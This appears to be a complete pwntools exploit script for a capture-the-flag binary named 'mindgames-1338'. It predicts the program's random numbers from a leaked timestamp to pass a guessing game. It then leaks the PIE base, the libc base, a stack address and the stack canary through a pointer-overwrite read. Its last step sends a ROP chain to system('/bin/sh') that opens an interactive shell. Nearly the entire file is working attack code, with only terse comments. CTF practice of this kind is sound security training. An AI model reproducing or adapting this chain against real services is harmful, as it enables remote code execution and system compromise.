#!/usr/bin/env python3

from datetime import datetime
from ctypes import CDLL
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

encode = lambda e: e if type(e) == bytes else str(e).encode()

exe = "./mindgames-1338"
elf = context.binary = ELF(exe)
libc = ELF('libc.so.6')
C = CDLL('libc.so.6')
io = process()
if args.GDB: gdb.attach(io, """
    b *main
""")

#================== getting remote connection ======================

io = remote("mindgames.secenv", 1338)

#================ Functions used again and again ====================

#================ sending random number func =======================

def menu(idx: int):
    io.sendlineafter(b">", encode(idx))

#================  getting leak and filtering the address ================

def get_leak(payload, parse=True):
    io.sendafter(b'name: ', payload)
    menu(1)
    io.recvuntil(b"highscore:")
    io.recvuntil(b"\t by \t ")
    leak = io.recvline()
    return fixleak(leak) if parse else leak[:-1]

#============== Bypassing the random number guess ==========================

def bypassranval(extra=False):
    if extra: C.rand()
    menu(2)
    menu(C.rand())
    for i in range(highscore):
        menu(C.rand())
    menu(1234)
    
#======================= getting the srand seed ============================


strdate = re.findall(b"[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", io.recvline())[0].decode()
epoch = datetime.strptime(strdate+'-+0000',"%Y-%m-%d %H:%M:%S-%z").timestamp()

# C.srand(int(epoch) - 18000)
C.srand(int(epoch))
randval = C.rand()
highscore = (C.rand() % 32) + 1
info(f"Highscore: {highscore}")

#=================== bypassranval() ==================================

bypassranval()

#==================Finding Binary Base address=====================
payload = flat(
    cyclic(32, n=8),
    0x1,
    b"\xe8"             # to bypass pie we give pointer last byte
)
leaked_pie = get_leak(payload)
elf.address = leaked_pie  - 0x40e8
info("leaked pie @ %#x " % leaked_pie)
info("elf base @ %#x" % elf.address)

#=================== bypassranval() ==================================

bypassranval(extra=True)

#===============Finding libc base addresss==========================
payload = flat(
    cyclic(32, n=8),
    0x1,
    elf.got.puts       # to leak libc_address
)
puts = get_leak(payload)
info("leaked puts @ %#x " % puts)
libc.address = puts - libc.sym.puts
# libc.address = puts - 0x83630
info("libc base @ %#x " % libc.address)

#=================== bypassranval() ==================================

bypassranval(extra=True)

#============== Bypassing canary mitigation by using environ =========

payload = flat(
    cyclic(32, n=8),
    0x1,
    libc.sym.environ   # now we will leak stack address using environment variables
)

#=================== getting leak stack =========================

stack = get_leak(payload)
info("stack @ %#x" % stack)    # here's our stack address

#=================== bypassranval() ==================================

bypassranval(extra=True)

#==================== get_leak() canary ====================================

payload = flat(
    cyclic(32, n=8),
    0x1,
    stack - (0x90-0x1) # -1 so that the last byte of canary i.e. 00 is skipped to avoid printf ending
)

# this will give us canary because its on the stack

canary = unpack(get_leak(payload, parse=False).rjust(8, b"\x00"))
info("canary  @ %#x" % canary)

#=================== bypassranval() ==================================

bypassranval(extra=True)

#================= Now we will bypass NX bit =====================

rop = ROP(libc)
payload = flat(
    cyclic(0x108, n=8),
    canary,
    cyclic(0x8, n=8),
    
    rop.rdi.address,
    next(libc.search(b"/bin/sh\x00")),
    rop.ret.address,
    libc.sym.system
)

#================= Final payload created above ==========================

io.sendlineafter(b"name: ", payload)
io.interactive()